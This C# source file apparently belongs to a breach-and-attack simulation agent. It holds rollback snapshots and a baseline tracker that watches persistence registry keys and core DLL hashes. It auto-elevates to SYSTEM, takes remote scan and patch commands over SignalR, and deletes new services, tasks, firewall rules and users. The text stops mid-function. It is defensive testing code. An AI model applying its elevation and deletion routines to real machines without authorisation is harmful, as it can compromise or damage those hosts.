using System.Diagnostics;
using Microsoft.AspNetCore.SignalR.Client;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Configuration;
using YamlDotNet.Serialization;
using YamlDotNet.Serialization.NamingConventions;


using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.ServiceProcess;
using System.Linq;

// Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
// SHARED MODELS  (mirror of the server-side types)
// Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
public enum CheckResult { Pass, Fail, Skipped, Blocked }

record class SimCheck
{
    public string Id           { get; set; } = Guid.NewGuid().ToString("N")[..8];
    public string Name         { get; set; } = "";
    public string TechniqueId  { get; set; } = "";
    public CheckResult Result  { get; set; } = CheckResult.Skipped;
    public string Severity     { get; set; } = "";   // Critical | High | Medium | Low
    public string ThreatImpact { get; set; } = "";   // what happens if this fails in prod
    public string Details      { get; set; } = "";
    public string Remediation  { get; set; } = "";
    public long   DurationMs   { get; set; }
    public bool   IsNew        { get; set; } = true;
}

class SimulationCategory
{
    public string Id       { get; set; } = Guid.NewGuid().ToString("N")[..8];
    public string Name     { get; set; } = "";
    public string Phase    { get; set; } = "";
    public List<SimCheck> Checks { get; set; } = new();
}

class AgentReport
{
    public string AgentId   { get; set; } = "";
    public string Hostname  { get; set; } = "";
    public string IpAddress { get; set; } = "";
    public string OsVersion { get; set; } = "";
    public string Username  { get; set; } = "";
    public DateTimeOffset StartedAt  { get; set; }
    public DateTimeOffset CompletedAt { get; set; }
    public string Status    { get; set; } = "Completed";
    public string EnvironmentLabel { get; set; } = "Production";
    public List<SecurityTool> SecurityTools { get; set; } = new();  // Ã¢Ëœâ€¦ NEW
    public List<SimulationCategory> Categories { get; set; } = new();
}

/// <summary>A security product installed on the endpoint.</summary>
class SecurityTool
{
    public string Name    { get; set; } = "";
    public string Vendor  { get; set; } = "";
    public string Type    { get; set; } = "";   // AV | EDR | Firewall | HIDS | DLP | Other
    public string Status  { get; set; } = "";   // Active | Inactive | Unknown
}

class AgentHeartbeat
{
    public string AgentId   { get; set; } = "";
    public string Hostname  { get; set; } = "";
    public string IpAddress { get; set; } = "";
    public string OsVersion { get; set; } = "";
    public string Username  { get; set; } = "";
    public string Status    { get; set; } = "idle";
    public string EnvironmentLabel { get; set; } = "Production";
}

class CtiIoc
{
    public string Type { get; set; } = "";
    public string Value { get; set; } = "";
    public string Source { get; set; } = "";
    public string Severity { get; set; } = "High";
    public string DateAdded { get; set; } = "";
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// SYSTEM STATE SNAPSHOTS (ROLLBACK ENGINES)
// Ensures simulations are 100% non-destructive.
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
class RegistrySnapshot : IDisposable
{
    private readonly RegistryKey _baseKey;
    private readonly string _subKeyPath;
    private readonly string _valueName;
    private readonly object? _originalValue;
    private readonly RegistryValueKind _originalKind;
    private readonly bool _existed;

    public RegistrySnapshot(RegistryKey baseKey, string subKeyPath, string valueName)
    {
        _baseKey = baseKey;
        _subKeyPath = subKeyPath;
        _valueName = valueName;

        try
        {
            using var key = _baseKey.OpenSubKey(_subKeyPath, false);
            if (key != null && key.GetValue(_valueName) != null)
            {
                _originalValue = key.GetValue(_valueName);
                _originalKind = key.GetValueKind(_valueName);
                _existed = true;
            }
            else
            {
                _existed = false;
            }
        }
        catch { _existed = false; }

        SimulationArtifactTracker.LogArtifact(
            ArtifactType.Registry,
            $@"{(_baseKey == Registry.CurrentUser ? "HKCU" : "HKLM")}\{_subKeyPath}::{_valueName}",
            _existed ? _originalValue?.ToString() : null, null);
    }

    public void Dispose()
    {
        try
        {
            using var key = _baseKey.OpenSubKey(_subKeyPath, true);
            if (key != null)
            {
                if (_existed)
                {
                    key.SetValue(_valueName, _originalValue!, _originalKind);
                }
                else
                {
                    key.DeleteValue(_valueName, false);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Failed to rollback registry state for {_valueName}: {ex.Message}");
        }

        SimulationArtifactTracker.LogArtifact(
            ArtifactType.Registry,
            $@"{(_baseKey == Registry.CurrentUser ? "HKCU" : "HKLM")}\{_subKeyPath}::{_valueName}",
            null, _existed ? "restored" : "deleted");
    }
}

class FileSnapshot : IDisposable
{
    private readonly string _targetPath;
    private readonly string _backupPath;
    private readonly bool _existed;

    public FileSnapshot(string targetPath)
    {
        _targetPath = targetPath;
        _backupPath = targetPath + ".bak";
        _existed = File.Exists(_targetPath);

        if (_existed)
        {
            try { File.Copy(_targetPath, _backupPath, true); }
            catch { }
        }

        SimulationArtifactTracker.LogArtifact(
            ArtifactType.File, _targetPath,
            _existed ? "existed" : null, null);
    }

    public void Dispose()
    {
        try
        {
            if (_existed)
            {
                if (File.Exists(_backupPath))
                {
                    File.Copy(_backupPath, _targetPath, true);
                    File.Delete(_backupPath);
                }
            }
            else
            {
                if (File.Exists(_targetPath))
                {
                    File.Delete(_targetPath);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Failed to rollback file state for {_targetPath}: {ex.Message}");
        }

        SimulationArtifactTracker.LogArtifact(
            ArtifactType.File, _targetPath,
            null, _existed ? "restored" : "deleted");
    }
}

// ============================================================
// SIMULATION ARTIFACT TRACKER
// Central pre-capture → log → rollback → validate engine.
// Covers: Registry, Files, Services, Scheduled Tasks,
//         Firewall Rules, Local Users, Temp Files.
// ============================================================

enum ArtifactType { Registry, File, Service, ScheduledTask, FirewallRule, LocalUser, TempFile, Process }

record ArtifactEntry(
    ArtifactType   Type,
    string         Key,
    string?        BeforeValue,
    string?        AfterValue,
    DateTimeOffset Timestamp,
    string?        CheckName = null);

static class SimulationArtifactTracker
{
    // ── Baselines ────────────────────────────────────────────
    static readonly Dictionary<string, string?> _regBaseline      = new(StringComparer.OrdinalIgnoreCase);
    static readonly Dictionary<string, string?> _serviceBaseline  = new(StringComparer.OrdinalIgnoreCase);
    static readonly HashSet<string>             _taskBaseline     = new(StringComparer.OrdinalIgnoreCase);
    static readonly HashSet<string>             _firewallBaseline = new(StringComparer.OrdinalIgnoreCase);
    static readonly HashSet<string>             _userBaseline     = new(StringComparer.OrdinalIgnoreCase);
    static readonly Dictionary<string, string>  _fileHashBaseline = new(StringComparer.OrdinalIgnoreCase);
    static readonly Dictionary<string, string>  _dirBaseline      = new(StringComparer.OrdinalIgnoreCase);

    // ── Change log & rollback stack ──────────────────────────
    static readonly List<ArtifactEntry>                      _log           = new();
    static readonly Stack<(string Label, Func<Task> Action)> _rollbackStack = new();
    static readonly object                                   _lock          = new();

    // ── Watched registry keys ────────────────────────────────
    static readonly string[] _regKeys =
    {
        @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
        @"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
        @"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager",
        @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit",
    };

    // ── Core DLLs to hash ────────────────────────────────────
    static readonly string[] _coreFiles =
        { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll",
          "user32.dll", "amsi.dll", "wldp.dll" };

    // ── Directories to watch for new files ───────────────────
    static string[] WatchDirs => new[]
    {
        Path.GetTempPath(),
        Environment.GetFolderPath(Environment.SpecialFolder.Startup),
        Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers"),
    };

    // ── Public API ───────────────────────────────────────────

    public static void CaptureBaseline()
    {
        Console.WriteLine("[Tracker] Capturing pre-simulation baseline (registry, services, tasks, firewall, users, files)...");

        foreach (var k in _regKeys)
            _regBaseline[k] = SnapRegistryKey(k);

        foreach (var (n, v) in SnapServices())
            _serviceBaseline[n] = v;

        foreach (var t in SnapScheduledTasks())
            _taskBaseline.Add(t);

        foreach (var r in SnapFirewallRules())
            _firewallBaseline.Add(r);

        foreach (var u in SnapLocalUsers())
            _userBaseline.Add(u);

        var sys = Environment.GetFolderPath(Environment.SpecialFolder.System);
        foreach (var f in _coreFiles)
            _fileHashBaseline[f] = HashFile(Path.Combine(sys, f));

        foreach (var dir in WatchDirs)
        {
            try
            {
                _dirBaseline[dir] = string.Join("|",
                    Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly)
                             .Select(Path.GetFileName).OrderBy(x => x));
            }
            catch { _dirBaseline[dir] = "ERROR"; }
        }

        Console.WriteLine($"[Tracker] Baseline: {_regBaseline.Count} reg keys, " +
                          $"{_serviceBaseline.Count} services, {_taskBaseline.Count} tasks, " +
                          $"{_firewallBaseline.Count} firewall rules, {_userBaseline.Count} users.");
    }

    public static void LogArtifact(ArtifactType type, string key,
                                   string? before, string? after, string? checkName = null)
    {
        lock (_lock)
            _log.Add(new ArtifactEntry(type, key, before, after, DateTimeOffset.UtcNow, checkName));
    }

    public static void RegisterRollback(string label, Func<Task> action)
    {
        lock (_lock)
            _rollbackStack.Push((label, action));
    }

    public static IReadOnlyList<ArtifactEntry> GetLog() => _log;

    public static async Task<List<string>> RollbackAll()
    {
        var results = new List<string>();
        int total = _rollbackStack.Count;

        Console.WriteLine($"[Tracker] ── Rollback started ({total} registered action(s)) ──────────────");

        // Execute registered rollback lambdas in reverse (LIFO)
        int idx = 1;
        while (_rollbackStack.Count > 0)
        {
            var (label, action) = _rollbackStack.Pop();
            Console.Write($"[Tracker]   [{idx++}/{total}] Rolling back: {label} ... ");
            try
            {
                await action();
                Console.WriteLine("OK");
                results.Add($"[+] Rolled back: {label}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"FAILED — {ex.Message}");
                results.Add($"[!] Rollback failed: {label} — {ex.Message}");
            }
        }

        // Diff-based safety-net sweep
        Console.WriteLine("[Tracker]   Scanning for unreversed services ...");
        await DiffAndClean("service",
            SnapServices().Keys, _serviceBaseline.Keys,
            name => RunTrackerCmd("sc", $"delete \"{name}\""), results);

        Console.WriteLine("[Tracker]   Scanning for unreversed scheduled tasks ...");
        await DiffAndClean("scheduled task",
            SnapScheduledTasks(), _taskBaseline,
            name => RunTrackerCmd("schtasks", $"/delete /tn \"{name}\" /f"), results);

        Console.WriteLine("[Tracker]   Scanning for unreversed firewall rules ...");
        await DiffAndClean("firewall rule",
            SnapFirewallRules(), _firewallBaseline,
            name => RunTrackerCmd("netsh", $"advfirewall firewall delete rule name=\"{name}\""), results);

        Console.WriteLine("[Tracker]   Scanning for unreversed local users ...");
        await DiffAndClean("local user",
            SnapLocalUsers(), _userBaseline,
            name => RunTrackerCmd("net", $"user \"{name}\" /delete"), results);

        // Remove any bas_*.* temp artifacts left behind
        Console.WriteLine("[Tracker]   Cleaning up bas_*.* temp files ...");
        int tempCleaned = 0;
        try
        {
            foreach (var f in Directory.GetFiles(Path.GetTempPath(), "bas_*.*", SearchOption.TopDirectoryOnly))
            {
                try
                {
                    File.Delete(f);
                    Console.WriteLine($"[Tracker]     Deleted: {Path.GetFileName(f)}");
                    results.Add($"[+] Deleted temp artifact: {Path.GetFileName(f)}");
                    tempCleaned++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Tracker]     Could not delete: {Path.GetFileName(f)} — {ex.Message}");
                    results.Add($"[!] Could not delete {Path.GetFileName(f)}: {ex.Message}");
                }
            }
        }
        catch { }

        int failed  = results.Count(r => r.StartsWith("[!]"));
        int success = results.Count(r => r.StartsWith("[+]"));
        Console.WriteLine($"[Tracker] ── Rollback complete: {success} restored, {tempCleaned} temp files cleaned, {failed} failed ──");

        return results;
    }

    public static async Task<List<string>> ValidateClean()
    {
        var residue = new List<string>();
        Console.WriteLine("[Tracker] ── Validating endpoint state against pre-simulation baseline ───────");

        Console.Write("[Tracker]   Registry keys ... ");
        int regDrift = 0;
        foreach (var (k, baseline) in _regBaseline)
        {
            var current = SnapRegistryKey(k);
            if (current != baseline)
            { residue.Add($"Registry drift — {k.Split('\\').Last()}"); regDrift++; }
        }
        Console.WriteLine(regDrift == 0 ? "CLEAN" : $"{regDrift} drift(s) detected");

        Console.Write("[Tracker]   Services ... ");
        int svcNew = 0;
        foreach (var name in SnapServices().Keys)
            if (!_serviceBaseline.ContainsKey(name))
            { residue.Add($"Service not removed — {name}"); svcNew++; }
        Console.WriteLine(svcNew == 0 ? "CLEAN" : $"{svcNew} unreversed");

        Console.Write("[Tracker]   Scheduled tasks ... ");
        int taskNew = 0;
        foreach (var t in SnapScheduledTasks())
            if (!_taskBaseline.Contains(t))
            { residue.Add($"Scheduled task not removed — {t}"); taskNew++; }
        Console.WriteLine(taskNew == 0 ? "CLEAN" : $"{taskNew} unreversed");

        Console.Write("[Tracker]   Firewall rules ... ");
        int fwNew = 0;
        foreach (var r in SnapFirewallRules())
            if (!_firewallBaseline.Contains(r))
            { residue.Add($"Firewall rule not removed — {r}"); fwNew++; }
        Console.WriteLine(fwNew == 0 ? "CLEAN" : $"{fwNew} unreversed");

        Console.Write("[Tracker]   Local users ... ");
        int usrNew = 0;
        foreach (var u in SnapLocalUsers())
            if (!_userBaseline.Contains(u))
            { residue.Add($"Local user not removed — {u}"); usrNew++; }
        Console.WriteLine(usrNew == 0 ? "CLEAN" : $"{usrNew} unreversed");

        Console.Write("[Tracker]   Core system file hashes ... ");
        int fileModified = 0;
        var sys = Environment.GetFolderPath(Environment.SpecialFolder.System);
        foreach (var f in _coreFiles)
        {
            var current = HashFile(Path.Combine(sys, f));
            if (_fileHashBaseline.TryGetValue(f, out var h) &&
                h is not ("UNREADABLE" or "ERROR") && current != h)
            { residue.Add($"Core file tampered — {f}"); fileModified++; }
        }
        Console.WriteLine(fileModified == 0 ? "CLEAN" : $"{fileModified} tampered");

        Console.Write("[Tracker]   Watched directories ... ");
        int dirNew = 0;
        foreach (var dir in WatchDirs)
        {
            if (!_dirBaseline.TryGetValue(dir, out var baseList) || baseList == "ERROR") continue;
            try
            {
                var baseSet = new HashSet<string>(baseList.Split('|'), StringComparer.OrdinalIgnoreCase);
                foreach (var f in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly)
                                           .Select(Path.GetFileName)
                                           .Where(x => x != null).Select(x => x!))
                    if (!baseSet.Contains(f))
                    { residue.Add($"New file in {Path.GetFileName(dir)} — {f}"); dirNew++; }
            }
            catch { }
        }
        Console.WriteLine(dirNew == 0 ? "CLEAN" : $"{dirNew} new file(s)");

        if (residue.Count == 0)
            Console.WriteLine("[Tracker] ── Validation PASSED — endpoint is in original state ────────────");
        else
        {
            Console.WriteLine($"[Tracker] ── Validation FAILED — {residue.Count} residual artifact(s) ────────────");
            foreach (var r in residue)
                Console.WriteLine($"[Tracker]     ! {r}");
        }

        await Task.CompletedTask;
        return residue;
    }

    // ── Internal helpers ─────────────────────────────────────

    static async Task DiffAndClean(string label,
        IEnumerable<string> current, IEnumerable<string> baseline,
        Func<string, Task> cleanup, List<string> log)
    {
        var baseSet = new HashSet<string>(baseline, StringComparer.OrdinalIgnoreCase);
        foreach (var item in current)
        {
            if (baseSet.Contains(item)) continue;
            try   { await cleanup(item); log.Add($"[+] Removed new {label}: {item}"); }
            catch (Exception ex) { log.Add($"[!] Failed to remove {label} '{item}': {ex.Message}"); }
        }
    }

    static async Task RunTrackerCmd(string exe, string args)
    {
        var psi = new ProcessStartInfo(exe, args)
            { CreateNoWindow = true, UseShellExecute = false,
              RedirectStandardOutput = true, RedirectStandardError = true };
        using var p = Process.Start(psi)!;
        await p.WaitForExitAsync();
    }

    static string? SnapRegistryKey(string keyPath)
    {
        try
        {
            var parts = keyPath.Split('\\', 2);
            var hive  = parts[0].Equals("HKCU", StringComparison.OrdinalIgnoreCase)
                        ? Registry.CurrentUser : Registry.LocalMachine;
            using var k = hive.OpenSubKey(parts[1]);
            if (k == null) return null;
            return string.Join("|",
                k.GetValueNames().OrderBy(v => v).Select(v => $"{v}={k.GetValue(v)}"));
        }
        catch { return "ERROR"; }
    }

    static Dictionary<string, string?> SnapServices()
    {
        var result = new Dictionary<string, string?>(StringComparer.OrdinalIgnoreCase);
        try
        {
            foreach (var svc in ServiceController.GetServices())
            {
                try   { result[svc.ServiceName] = $"{svc.StartType}|{svc.Status}"; }
                catch { result[svc.ServiceName] = "ERROR"; }
            }
        }
        catch { }
        return result;
    }

    static HashSet<string> SnapScheduledTasks()
    {
        var tasks = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        try
        {
            var psi = new ProcessStartInfo("schtasks", "/query /fo CSV /nh")
                { CreateNoWindow = true, UseShellExecute = false,
                  RedirectStandardOutput = true, RedirectStandardError = true };
            using var p = Process.Start(psi)!;
            var output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            foreach (var line in output.Split('\n'))
            {
                var trimmed = line.Trim();
                if (trimmed.Length < 3 || !trimmed.StartsWith('"')) continue;
                var end = trimmed.IndexOf('"', 1);
                if (end > 1) tasks.Add(trimmed[1..end]);
            }
        }
        catch { }
        return tasks;
    }

    static HashSet<string> SnapFirewallRules()
    {
        var rules = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        try
        {
            var psi = new ProcessStartInfo("netsh", "advfirewall firewall show rule name=all")
                { CreateNoWindow = true, UseShellExecute = false,
                  RedirectStandardOutput = true, RedirectStandardError = true };
            using var p = Process.Start(psi)!;
            var output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            foreach (var line in output.Split('\n'))
            {
                if (!line.TrimStart().StartsWith("Rule Name:", StringComparison.OrdinalIgnoreCase)) continue;
                var name = line.Split(':', 2).ElementAtOrDefault(1)?.Trim();
                if (!string.IsNullOrEmpty(name)) rules.Add(name);
            }
        }
        catch { }
        return rules;
    }

    static HashSet<string> SnapLocalUsers()
    {
        var users = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        try
        {
            var psi = new ProcessStartInfo("net", "user")
                { CreateNoWindow = true, UseShellExecute = false,
                  RedirectStandardOutput = true, RedirectStandardError = true };
            using var p = Process.Start(psi)!;
            var output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            bool inSection = false;
            foreach (var line in output.Split('\n'))
            {
                if (line.Contains("---"))         { inSection = true; continue; }
                if (line.Contains("The command")) break;
                if (!inSection) continue;
                foreach (var tok in line.Split(' ', StringSplitOptions.RemoveEmptyEntries))
                    users.Add(tok.Trim());
            }
        }
        catch { }
        return users;
    }

    static string HashFile(string path)
    {
        try
        {
            using var fs = File.OpenRead(path);
            return BitConverter.ToString(
                System.Security.Cryptography.SHA256.HashData(fs)).Replace("-", "");
        }
        catch { return "UNREADABLE"; }
    }
}


// Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
// MAIN ENTRY Ã¢â‚¬â€ handles elevation & orchestration
// Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
partial class Program
{
    // Configuration
    static readonly string ServerUrl;

    // Agent Identity
    static readonly string AgentId;
    static readonly string Hostname;
    static readonly string IpAddress;
    static readonly string OsVersion;
    static readonly string Username;
    static readonly string EnvironmentLabel;

    // Patch install state Ã¢â‚¬â€ persisted to server so page refresh shows correct status
    static string _patchPhase = "idle";  // idle | scanning | downloading | installing | done | failed
    static string _patchLog   = "";

    static Program()
    {
        // Load configuration
        var config = new Microsoft.Extensions.Configuration.ConfigurationBuilder()
            .SetBasePath(AppContext.BaseDirectory)
            .AddJsonFile("appsettings.json", optional: false)
            .Build();

        ServerUrl = Environment.GetEnvironmentVariable("BAS_SERVER_URL")
                    ?? config["ServerUrl"]
                    ?? "http://localhost:5000";

        // Agent identity
        Hostname   = Environment.MachineName;
        Username   = Environment.UserName;
        OsVersion  = Environment.OSVersion.ToString();
        IpAddress = NetworkInterface.GetAllNetworkInterfaces()
            .FirstOrDefault(n => n.OperationalStatus == OperationalStatus.Up && 
                                n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            ?.GetIPProperties().UnicastAddresses
            .FirstOrDefault(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            ?.Address.ToString() ?? "127.0.0.1";
        // Stable agent ID = hash of hostname so re-runs update the same entry
        AgentId    = BitConverter.ToString(System.Security.Cryptography.SHA256.HashData(
                         Encoding.UTF8.GetBytes(Hostname))).Replace("-","")[..16];
                         
        EnvironmentLabel = Environment.GetEnvironmentVariable("BAS_ENV_TYPE") ?? "Production";
    }

    // ============================================================
    // UPDATED MAIN: Setup SignalR and Stay Alive
    // ============================================================
    static async Task<int> Main(string[] args)
    {
        // 1. Auto-elevate if not already admin
        if (!IsAdmin()) return ElevateAndRestart();
        
        // 1.5 Attempt SYSTEM elevation (best-effort, continues as Admin if unavailable)
        if (!IsSystem()) ElevateToSystemAndRestart();

        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("[BAS Agent] Running as SYSTEM IL.");
        Console.WriteLine($"[BAS Agent] Connecting to: {ServerUrl}");

        // Suppress WER crash dialogs and critical-error popups for this process and children
        SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

        // 1b. Dependency self-check: auto-fix what we can before doing anything
        await EnsureDependencies();

        var connection = new HubConnectionBuilder()
            .WithUrl($"{ServerUrl}/bashub", options =>
            {
                // Configure HTTP client for better compatibility
                options.HttpMessageHandlerFactory = (handler) =>
                {
                    if (handler is HttpClientHandler clientHandler)
                    {
                        // Disable SSL validation if testing (remove in production)
                        // clientHandler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                    }
                    return handler;
                };
                
                // Set timeouts
                options.Transports = Microsoft.AspNetCore.Http.Connections.HttpTransportType.WebSockets | 
                                   Microsoft.AspNetCore.Http.Connections.HttpTransportType.ServerSentEvents |
                                   Microsoft.AspNetCore.Http.Connections.HttpTransportType.LongPolling;
            })
            .WithAutomaticReconnect()
            .Build();

        

        // 3. Listen for the remote "Scan Again" command from the dashboard
        connection.On<string>("command_scan", async (targetId) =>
        {
            if (targetId == AgentId)
            {
                Console.WriteLine("\n[!] Remote trigger received from dashboard. Restarting scan...");
                await RunFullSimulation();
            }
        });

        // Listen for remote "Install Patches" command from the dashboard
        connection.On<string>("command_install_patches", async (targetId) =>
        {
            if (targetId == AgentId)
            {
                Console.WriteLine("\n[!] Install Patches command received. Triggering Windows Update...");
                await InstallWindowsUpdates();
            }
        });

        try 
        {
            Console.WriteLine("[*] Attempting SignalR connection...");
            await connection.StartAsync();
            Console.WriteLine("[*] SignalR Connected to Hub.");
        }
        catch (HttpRequestException rex)
        {
            Console.WriteLine($"[!] HTTP connection failed: {rex.Message}");
            Console.WriteLine($"[!] Server URL: {ServerUrl}/bashub");
            Console.WriteLine($"[!] Check if server is accessible and running.");
        }
        catch (Exception ex) 
        {
            Console.WriteLine($"[!] Hub connection failed: {ex.Message}");
            Console.WriteLine($"[!] Exception Type: {ex.GetType().Name}");
            if (ex.InnerException != null)
                Console.WriteLine($"[!] Inner Exception: {ex.InnerException.Message}");
        }

        // 4. Initial Run on Startup
        await RunFullSimulation();

        Console.WriteLine("\n[*] Agent is Idle. Waiting for remote commands... (Don't close this window)");

        // 5. KEEP ALIVE + periodic heartbeat so the server always knows this agent is alive,
        //    even after a server restart flushes the in-memory cache.
        _ = Task.Run(async () =>
        {
            while (true)
            {
                await Task.Delay(TimeSpan.FromSeconds(30));
                await SendHeartbeat("idle");
            }
        });

        await Task.Delay(-1);
        return 0;
    }

    // ============================================================
    // DEPENDENCY SELF-CHECK
    // Runs at startup to verify and auto-fix prerequisites.
    // The agent is self-contained (.NET bundled) so no runtime needed,
    // but Windows-level tools must be accessible.
    // ============================================================
    static async Task EnsureDependencies()
    {
        Console.WriteLine();
